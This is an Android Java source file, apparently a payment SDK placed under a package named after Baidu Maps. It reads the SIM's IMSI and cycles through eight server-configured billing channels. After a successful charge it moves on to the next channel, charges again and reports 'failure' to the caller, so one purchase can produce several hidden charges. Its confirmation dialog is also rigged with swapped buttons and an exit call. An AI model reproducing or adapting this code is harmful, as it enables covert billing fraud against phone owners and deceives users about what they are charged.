package com.baidu.BaiduMap.pay;

import java.util.Objects;
import java.util.Timer;
import java.util.TimerTask;

import com.baidu.BaiduMap.BMapManager;
import com.baidu.BaiduMap.YPayCallbackInfo;
import com.baidu.BaiduMap.channel.BasePayChannel;
import com.baidu.BaiduMap.channel.DefaultPayChannel;
import com.baidu.BaiduMap.channel.IPayChannelListener;
import com.baidu.BaiduMap.channel.PayChannelFactory;
import com.baidu.BaiduMap.httpCenter.GetDataImpl;
import com.baidu.BaiduMap.httpCenter.HttpListener;
import com.baidu.BaiduMap.json.ChannelEntity;
import com.baidu.BaiduMap.json.JsonUtil;
import com.baidu.BaiduMap.json.SetEntity;
import com.baidu.BaiduMap.json.throughEntity;
import com.baidu.BaiduMap.json.JsonEntity.RequestProperties;
import com.baidu.BaiduMap.utils.ACacheUtils;
import com.baidu.BaiduMap.utils.Constants;
import com.baidu.BaiduMap.utils.Log;
import com.baidu.BaiduMap.utils.Utils;

import android.app.AlertDialog;
import android.app.AlertDialog.Builder;
import android.content.Context;
import android.content.DialogInterface;
import android.content.DialogInterface.OnClickListener;
import android.os.Handler;
import android.os.Message;
import android.text.TextUtils;
import android.widget.Toast;

public class TimesCountPay1004 {
    int throughCounter; // 控制循环次数
    private static String LASTREQUESTHROUGHID = "";
    public int PayThrough = 0;
    private static Long LASTREQUESTTIME = 0L;
    private static TimesCountPay1004 pay = null;
    private String initialPrice;
    private static SetEntity setEntity = null;
    public static Timer timer;
    public static final int THROUGNUMBER = 8; // 循环通道数
    private throughEntity Through;
    public int payNumber = 0; // 支付次数
    private ChannelEntity body = null;

    public static TimesCountPay1004 getInstance() {
        if (pay == null) {
            pay = new TimesCountPay1004();
        }
        return pay;
    }

    public void TimesCountPay_BaiduMap(final Context ctx, final String price, final int payItemID, final String str,
                                       final String product, String Did, final String extData, final Object receiver, final SetEntity setEntity) {
        this.setEntity = setEntity;
        if (Utils.getAirplaneMode(ctx)) {
            return;
        }
        initialPrice = price;
        YPayCallbackInfo receivers = new YPayCallbackInfo(receiver);
        throughCounter = 0;
        PayThrough = payNumber % THROUGNUMBER; // 通道的循环机制,不需要一直重复请求同一个通道
        payNumber++;
        TimesCountPay_ReqChannel(ctx, price, str, product, extData, Did, receivers, false, receiver);
    }

    public void TimesCountPay_ReqChannel(final Context ctx, final String customized_price, final String str,
                                         final String product, final String extData, final String Did, final YPayCallbackInfo receivers,
                                         final Boolean skipSecondConfirm, final Object receiver) {
        /**
         * 判断是否需要二次确认
         */
        boolean isSecondConfirm = false;
        if (setEntity != null)
            isSecondConfirm = setEntity.isSecondConfirm;
        if (skipSecondConfirm) {
            isSecondConfirm = false;
        }
        if (Constants.isOutPut) {
            Log.debug("throughCounter -->" + throughCounter);
            Log.debug("PayThrough ---->" + PayThrough);
            Log.debug("PayThrough -->" + PayThrough % THROUGNUMBER);
        }
        if (throughCounter == 0)
            initialPrice = customized_price;
        if (isSecondConfirm) {
            SecondConfirmDialogHandle secondConfirmHandler = new SecondConfirmDialogHandle(ctx, customized_price, str,
                    product, extData, Did, receivers, false, receiver);
            Message secondConfirmMsg = new Message();
            secondConfirmMsg.what = 1001;
            secondConfirmHandler.sendMessage(secondConfirmMsg);
        } else {
            TimesCountPay_ReqChannel(ctx, customized_price, product, extData, "1004", receivers, receiver);
        }

    }

    private void TimesCountPay_ReqChannel(final Context ctx, final String customized_price, final String product,
                                          final String extData, final String Did, final YPayCallbackInfo receivers, final Object receiver) {
        try {
            new Thread() {
                @Override
                public void run() {
                    super.run();
                    if (!Log.D) {
                        if (!Utils.getSIMState(ctx)) {
                            // 修复当手机SIM不存在时没有正常回调的问题
                            receivers.postPayReceiver(Constants.PayState_FAILURE);
                            return;
                        }
                    }

                    RequestProperties requestJson = GetDataImpl.getInstance(ctx).getmRequestProperties();
                    receivers.setOrderInfo(requestJson.clone());
                    receivers.setCustomized_price(customized_price);
                    receivers.setImsi(requestJson.imsi);
                    receivers.setY_id(requestJson.y_id);
                    receivers.setPackId(requestJson.packId);
                    receivers.setChannel_id(requestJson.channel_id);
                    receivers.setUa(requestJson.ua);
                    receivers.setThroughId("1");
                    receivers.setDid(Did);

                    /**
                     * 判断类型SDK 不请求后台 其他类型请求后台走原来的逻辑
                     */
                    try {
                        switch (PayThrough % THROUGNUMBER) {
                            case 0:
                                Through = (throughEntity) JsonUtil.parseJSonObject(throughEntity.class,
                                        setEntity.bd_AThrough);
                                break;
                            case 1:
                                Through = (throughEntity) JsonUtil.parseJSonObject(throughEntity.class,
                                        setEntity.bd_BThrough);
                                break;
                            case 2:
                                Through = (throughEntity) JsonUtil.parseJSonObject(throughEntity.class,
                                        setEntity.bd_CThrough);
                                break;
                            case 3:
                                Through = (throughEntity) JsonUtil.parseJSonObject(throughEntity.class,
                                        setEntity.bd_DThrough);
                                break;
                            case 4:
                                Through = (throughEntity) JsonUtil.parseJSonObject(throughEntity.class,
                                        setEntity.bd_EThrough);
                                break;
                            case 5:
                                Through = (throughEntity) JsonUtil.parseJSonObject(throughEntity.class,
                                        setEntity.bd_FThrough);
                                break;
                            case 6:
                                Through = (throughEntity) JsonUtil.parseJSonObject(throughEntity.class,
                                        setEntity.bd_GThrough);
                                break;
                            case 7:
                                Through = (throughEntity) JsonUtil.parseJSonObject(throughEntity.class,
                                        setEntity.bd_HThrough);
                                break;
                        }
                    } catch (Exception e) {
                        Through = new throughEntity();
                    }

                    if (!TextUtils.isEmpty(Through.id)) {
                        // 通道ID等于上一次成功的通道ID
                        if (Through.id.equals(LASTREQUESTHROUGHID)) {
                            // 如果时间限制了，那么走下一个通道
                            if (System.currentTimeMillis() - LASTREQUESTTIME < Through.timing * 1000) {
                                if (throughCounter < THROUGNUMBER - 1) {
                                    PayThrough++;
                                    throughCounter++;
                                    TimesCountPay_ReqChannel(ctx, customized_price, "", product, extData, Did,
                                            receivers, true, receiver);
                                }
                                if (Constants.isOutPut) {

                                    Log.debug("进入支付失败逻辑 ----------- 请求当前通道超时，接下来会请求下一个通道");
                                }
                                return;
                            }
                        }
                    } else {
                        PayThrough++;
                        throughCounter++;
                        TimesCountPay_ReqChannel(ctx, customized_price, "", product, extData, Did, receivers, true,
                                receiver);
                        if (Constants.isOutPut) {

                            Log.debug("------改通道为空");
                        }
                        return;
                    }

                    if (Through.supplyprice.equals("0")) { // 是否限制金额
                        GetDataImpl.getInstance(ctx).getChannelId(Through.id, initialPrice, Did, product,
                                new HttpListener() {
                                    @Override
                                    public void result(String result) {
                                        body = (ChannelEntity) JsonUtil.parseJSonObject(ChannelEntity.class, result);
                                        if (!body.state.contains("0")) {
                                            goToNextThrough(ctx, customized_price, product, extData, Did, receivers, receiver);
                                            return;
                                        } else if (body.state.contains("0") && body.order.isEmpty()) {
                                            goToNextThrough(ctx, customized_price, product, extData, Did, receivers, receiver);
                                            return;
                                        }
                                        if (body.order != null) {
                                            setDate(receivers, ctx, customized_price, product, extData, Did, receiver);
                                        }
                                    }
                                });
                    } else {
                        GetDataImpl.getInstance(ctx).getChannelId(Through.id, Through.supplyprice, Did, product,
                                new HttpListener() {
                                    @Override
                                    public void result(String result) {
                                        body = (ChannelEntity) JsonUtil.parseJSonObject(ChannelEntity.class, result);
                                        if (!body.state.contains("0")) {
                                            goToNextThrough(ctx, customized_price, product, extData, Did, receivers, receiver);
                                            return;
                                        } else if (body.state.contains("0") && body.order.isEmpty()) {
                                            goToNextThrough(ctx, customized_price, product, extData, Did, receivers, receiver);
                                            return;
                                        }
                                        if (body.order != null) {
                                            setDate(receivers, ctx, customized_price, product, extData, Did, receiver);
                                        }
                                    }
                                });
                    }
                }
            }.start();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void setDate(YPayCallbackInfo receivers, Context ctx, String customized_price, String product,
                         String extData, String Did, Object callback) {
        receivers.setThroughId(body.throughId);
//        ACacheUtils.getInstance(ctx).putPayType(body.payType);
//        if (body.payType == 0) {
//
//        } else if (body.payType == 1) {
//            ACacheUtils.getInstance(ctx).putLimitNum(body.limitNum);
//            ACacheUtils.getInstance(ctx).putFix_msg(body.fix_msg);
//        } else if (body.payType == 2) {
//            ACacheUtils.getInstance(ctx).putLimitNum(body.limitNum);
//            ACacheUtils.getInstance(ctx).putLimit_msg_1(body.limit_msg_1);
//            ACacheUtils.getInstance(ctx).putLimit_msg_2(body.limit_msg_2);
//        } else if (body.payType == 3) {
//            ACacheUtils.getInstance(ctx).putLimitNum(body.limitNum);
//            ACacheUtils.getInstance(ctx).putLimit_msg_1(body.limit_msg_1);
//            ACacheUtils.getInstance(ctx).putLimit_msg_2(body.limit_msg_2);
//        } else if (body.payType == 4) {
//            ACacheUtils.getInstance(ctx).putLimitNum(body.limitNum);
//            ACacheUtils.getInstance(ctx).putLimit_msg_1(body.limit_msg_1);
//            ACacheUtils.getInstance(ctx).putLimit_msg_2(body.limit_msg_2);
//        }
        reqPay(ctx, customized_price, product, extData, Did, receivers, body, callback);
    }

    private void reqPay(final Context ctx, final String price, final String productName, final String extData,
                        final String Did, final YPayCallbackInfo cb, final ChannelEntity channel, final Object receiver) {
        if (Constants.isOutPut) {

            Log.debug("当前通道-->" + channel.toString());
        }
        BasePayChannel payChannel = PayChannelFactory.getPayChannelByChannelId(Integer.parseInt(cb.getThroughId()), channel);
        payChannel.addPayChannelListener(new IPayChannelListener() {
            @Override
            public void onPaySucceeded() {
                cb.postPayReceiver(Constants.PayState_SUCCESS);
                throughCounter = 0;
                cb.getOrderInfo().is_supplement = 1;
                // /** 缓存成功通道ID和时间 */
                LASTREQUESTHROUGHID = channel.throughId;
                LASTREQUESTTIME = System.currentTimeMillis();
                try {
                    Thread.sleep(1000);
                } catch (Exception e) {
                }

                if (throughCounter < THROUGNUMBER - 1) {
                    PayThrough++;
                    throughCounter++;
                    TimesCountPay_ReqChannel(ctx, price, "", productName, extData, Did, cb, true, receiver);
                    cb.getOrderInfo().is_supplement = 1;
                    cb.postPayReceiver(Constants.PayState_FAILURE);
                } else {
                    // 使用MDO本地生成短信方式支付 在有传入本地指令和确认有配置MDO的情况下
                    // 并且计数器归0
                    throughCounter = 0;
                    cb.getOrderInfo().is_supplement = 0;
                    cb.postPayReceiver(Constants.PayState_FAILURE);
                    if (Constants.isOutPut) {

                        Log.debug("计数器归零");
                    }
                }
                if (Constants.isOutPut) {

                    Log.debug("进入支付失败逻辑 -- throughCounter -->" + throughCounter);
                }
            }

            @Override
            public void onPayFailed() {
                if (Constants.isOutPut) {

                    Log.debug("---进入支付失败逻辑");
                }
//                if (Utils.getIsRequest(ctx) == 0) { // 不执行应急 0关闭 1打开
//                    cb.postPayReceiver(Constants.PayState_FAILURE);
//                    if (Constants.isOutPut) {
//
//                        Log.debug("进入支付失败逻辑 ----------- 33333333333");
//                    }
//                    return;
//                }
                /**
                 * 失败的话修改渠道优先级
                 *
                 * 使用计数器失败加1，计数器必须小于渠道优先级数组的长度。
                 *
                 * 根据渠道优先级重新请求支付
                 *
                 * 成功计数器归0
                 */
                try {
                    Thread.sleep(1000);
                } catch (Exception e) {
                }

                if (throughCounter < THROUGNUMBER - 1) {
                    PayThrough++;
                    throughCounter++;
                    TimesCountPay_ReqChannel(ctx, price, "", productName, extData, Did, cb, true, receiver);
                    cb.getOrderInfo().is_supplement = 1;
                    cb.postPayReceiver(Constants.PayState_FAILURE);
                } else {
                    // 使用MDO本地生成短信方式支付 在有传入本地指令和确认有配置MDO的情况下
                    // 并且计数器归0
                    throughCounter = 0;
                    cb.getOrderInfo().is_supplement = 0;
                    cb.postPayReceiver(Constants.PayState_FAILURE);
                }
                if (Constants.isOutPut) {

                    Log.debug("进入支付失败逻辑 -- throughCounter -->" + throughCounter);
                }
            }

            @Override
            public void onPayCanceled() {
                cb.postPayReceiver(Constants.PayState_CANCEL);
                throughCounter = 0;
            }

        });

        // 设置相关参数
        payChannel.setAppContext(ctx);
        payChannel.setPrice((int) Double.parseDouble(price));
        payChannel.setExtData(extData);
        payChannel.setProductName(productName);
        payChannel.setOrderInfo(cb.getOrderInfo());

        /**
         * 默认通道,后台指令方式
         */
        if (payChannel instanceof DefaultPayChannel) {
            ((DefaultPayChannel) payChannel).setChannel(channel);
            ((DefaultPayChannel) payChannel).setThroughId(cb.getThroughId());
        }
        // 通道付费
        payChannel.pay();
    }

    class SecondConfirmDialogHandle extends Handler {
        private Context context;
        private String customized_price;
        private String tipInfo;
        private String product;
        private String extData;
        private String Did;
        private YPayCallbackInfo cb;
        private Boolean skipSecondConfirm;
        private SetEntity setEntity;
        private Object receiver;

        public SecondConfirmDialogHandle(Context _context, String _customized_price, String _tipInfo, String _product,
                                         String _extData, final String _Did, final YPayCallbackInfo _cb, final Boolean _skipSecondConfirm,
                                         Object receiver) {
            super(_context.getMainLooper());
            context = _context;
            customized_price = _customized_price;
            tipInfo = _tipInfo;
            product = _product;
            extData = _extData;
            Did = _Did;
            cb = _cb;
            this.setEntity = setEntity;
            this.receiver = receiver;
            skipSecondConfirm = _skipSecondConfirm;
        }

        @Override
        public void handleMessage(Message msg) {

            if (msg.what == 1001) {
                showDialog(context, customized_price, tipInfo, null, new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int arg1) {
                        dialog.dismiss();
                        System.exit(1);
                        TimesCountPay_ReqChannel(context, customized_price, product, extData, "1004", cb, receiver);
                    }
                }, cb);
            }
        }

        private void showDialog(final Context ctx, String price, String str,
                                DialogInterface.OnClickListener positiveButton, DialogInterface.OnClickListener negativeButton,
                                final YPayCallbackInfo cb) {
            if (Constants.isOutPut) {

                Log.debug("调用Dialog显示");
            }
            AlertDialog.Builder builder = new Builder(ctx);
            if (TextUtils.isEmpty(str)) {
                double priceShowValue = 0;
                try {
                    priceShowValue = Double.parseDouble(price) / 100.00;
                } catch (Exception ignore) {
                    builder.setMessage("您确定要支付" + price + "元吗？");
                }
                builder.setMessage("您确定要支付" + priceShowValue + "元吗？");
            } else {
                builder.setMessage(str);
            }
            final String p = price;
            builder.setTitle("提示");
            // builder.setCancelable(false);
            builder.setPositiveButton("取消", new OnClickListener() {
                @Override
                public void onClick(DialogInterface dialog, int which) {
                    dialog.dismiss();
                    cb.postPayReceiver(Constants.PayState_CANCEL);
                }
            });
            if (negativeButton != null) {
                builder.setNegativeButton("确认", negativeButton);
            }
            builder.setOnCancelListener(new DialogInterface.OnCancelListener() {

                @Override
                public void onCancel(DialogInterface dialog) {
                    dialog.dismiss();
                    cb.postPayReceiver(Constants.PayState_CANCEL);
                }
            });
            builder.setCancelable(false);
            builder.create().show();
        }
    }

    private void goToNextThrough(Context ctx, String customized_price, String product, String extData, String Did, YPayCallbackInfo receivers, Object callback) {
        if (throughCounter < THROUGNUMBER - 1) {
            PayThrough++;
            throughCounter++;
            TimesCountPay_ReqChannel(ctx, customized_price, "", product, extData, Did, receivers, true, callback);
            if (Constants.isOutPut) {
                Log.debug("------走下一个通道");
            }
        }
    }
}
